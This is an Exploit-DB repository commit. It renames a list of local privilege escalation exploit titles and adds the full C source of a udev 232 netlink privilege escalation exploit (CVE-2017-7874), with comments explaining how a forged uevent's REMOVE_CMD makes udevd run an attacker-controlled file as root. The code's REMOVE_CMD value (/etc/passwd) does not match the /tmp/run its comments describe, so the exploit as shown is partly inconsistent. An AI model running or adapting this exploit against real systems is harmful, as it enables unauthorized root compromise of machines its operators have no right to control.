b725a55435dac01a2925b62ce8b9f205b0b076b8
Offensive Security <info@exploit-db.com>
2017-04-16 05:01:17 +0000

    DB: 2017-04-16
    1 new exploits
    
    HP-UX B11.11 - /usr/bin/ct Local Format String Privilege Escalation
    HP-UX B11.11 - '/usr/bin/ct' Format String Privilege Escalation
    
    rsync 2.5.7 - Local Stack Overflow Privilege Escalation
    rsync 2.5.7 - Stack Overflow Privilege Escalation
    
    Linux Kernel 2.6.9 < 2.6.11 (RHEL 4) - 'SYS_EPoll_Wait' Local Integer Overflow Privilege Escalation
    Linux Kernel 2.6.9 < 2.6.11 (RHEL 4) - 'SYS_EPoll_Wait' Integer Overflow Privilege Escalation
    
    Kingsoft AntiVirus 2012 'KisKrnl.sys' 2011.7.8.913 - Local Kernel Mode Privilege Escalation
    Kingsoft AntiVirus 2012 'KisKrnl.sys' 2011.7.8.913 - Kernel Mode Privilege Escalation
    
    MSI - 'NTIOLib.sys' / 'WinIO.sys' Local Privilege Escalation
    MSI - 'NTIOLib.sys' / 'WinIO.sys' Privilege Escalation
    
    Linux Kernel UDEV < 1.4.1 - Netlink Privilege Escalation (Metasploit)
    Linux Kernel UDEV < 1.4.1 - 'Netlink' Privilege Escalation (Metasploit)
    
    Apache::Gallery 0.4/0.5/0.6 - Insecure Local File Storage Privilege Escalation
    Apache::Gallery 0.4/0.5/0.6 - Insecure File Storage Privilege Escalation
    
    Linux Kernel 2.6.x - 'SYS_EPoll_Wait' Local Integer Overflow Privilege Escalation (1)
    Linux Kernel 2.6.x - 'SYS_EPoll_Wait' Integer Overflow Privilege Escalation (1)
    
    Symantec Workspace Virtualization 6.4.1895.0 - Local Kernel Mode Privilege Escalation
    Symantec Workspace Virtualization 6.4.1895.0 - Kernel Mode Privilege Escalation
    
    Microsoft Windows - 'NDPROXY' Local SYSTEM Privilege Escalation (MS14-002)
    Microsoft Windows - 'NDPROXY' SYSTEM Privilege Escalation (MS14-002)
    
    Linux Kernel 3.14-rc1 < 3.15-rc4 (x64) - Raw Mode PTY Local Echo Race Condition Privilege Escalation
    Linux Kernel 3.14-rc1 < 3.15-rc4 (x64) - Raw Mode PTY Echo Race Condition Privilege Escalation
    
    Microsoft Windows - Local procedure Call (LPC) Privilege Escalation
    Microsoft Windows - Local Procedure Call (LPC) Privilege Escalation
    
    Symantec Encryption Desktop 10 - Local Buffer Overflow Privilege Escalation
    Symantec Encryption Desktop 10 - Buffer Overflow Privilege Escalation
    
    Wowza Streaming Engine 4.5.0 - Local Privilege Escalation
    Wowza Streaming Engine 4.5.0 - Privilege Escalation
    
    PCAUSA Rawether (ASUS PCE-AC56 WLAN Card Utilities Windows 10 x64) - Local Privilege Escalation
    PCAUSA Rawether (ASUS PCE-AC56 WLAN Card Utilities Windows 10 x64) - Privilege Escalation
    
    Linux Kernel 4.8.0 UDEV < 232 - Privilege Escalation
    
    PonyOS 4.0 - 'fluttershy' LD_LIBRARY_PATH Local Kernel Exploit
    PonyOS 4.0 - 'fluttershy' LD_LIBRARY_PATH Kernel Privilege Escalation

---
+++ platforms/linux/local/41886.c
@@ -0,0 +1,97 @@
+/*
+# Title: Linux Kernel 4.8.0 udev 232 - Privilege Escalation
+# Author: Nassim Asrir
+# Researcher at: Henceforth
+# Author contact: wassline@gmail.com || https://www.linkedin.com/in/nassim-asrir-b73a57122/
+# The full Research: https://www.facebook.com/asrirnassim/
+# CVE: CVE-2017-7874
+
+# Exp #
+
+first of all we need to know a small infos about udev and how it work
+
+the udev deamon is responsible for receiving device events from the kernel 
+
+and this event are delivered to udev via netlink (is a socket family) 
+
+you can read more about udev from: https://en.wikipedia.org/wiki/Udev
+
+# Exploit #
+
+The udev vulnerability resulted from a lack of verification of the netlink message source in udevd.
+
+read lines from: /lib/udev/rules.d/50-udev-default.rules
+
+all we need is this action: ACTION=="remove", ENV{REMOVE_CMD}!="", RUN+="$env{REMOVE_CMD}"    
+
+this action allows execution of arbitrary commands.
+
+in our exploit we specifying a malicious REMOVE_CMD and causes the privileged execution of attacker-controlled /tmp/run file.
+
+Get your udev version:
+
+Execute: $ udevadm --version
+
+//output: 232
+
+Maybe < 232 also is vulnerable 
+*/
+
+
+
+// gcc rootme.c -o rootme
+// ./rootme
+// segmantation fault 
+
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <linux/types.h>
+#include <linux/netlink.h>
+
+#ifndef NETLINK_KOBJECT_UEVENT
+#define NETLINK_KOBJECT_UEVENT 15
+#endif
+
+int
+main(int argc, char **argv)
+{
+  int sock;
+  char *mp;
+  char message[4096];
+  struct msghdr msg;
+  struct iovec iovector;
+  struct sockaddr_nl address;
+
+  memset(&address, 0, sizeof(address));
+  address.nl_family = AF_NETLINK;
+  address.nl_pid = atoi(argv[1]);
+  address.nl_groups = 0;
+
+  msg.msg_name = (void*)&address;
+  msg.msg_namelen = sizeof(address);
+  msg.msg_iov = &iovector;
+  msg.msg_iovlen = 1;
+
+  sock = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_KOBJECT_UEVENT);
+  bind(sock, (struct sockaddr *) &address, sizeof(address));
+
+  mp = message;
+  mp += sprintf(mp, "a@/d") + 1;
+  mp += sprintf(mp, "SUBSYSTEM=block") + 1;
+  mp += sprintf(mp, "DEVPATH=/dev/foo") + 1;
+  mp += sprintf(mp, "TIMEOUT=10") + 1;
+  mp += sprintf(mp, "ACTION=remove") +1;
+  mp += sprintf(mp, "REMOVE_CMD=/etc/passwd") +1;
+
+  iovector.iov_base = (void*)message;
+  iovector.iov_len = (int)(mp-message);
+
+  sendmsg(sock, &msg, 0);
+
+  close(sock);
+
+  return 0;
+}
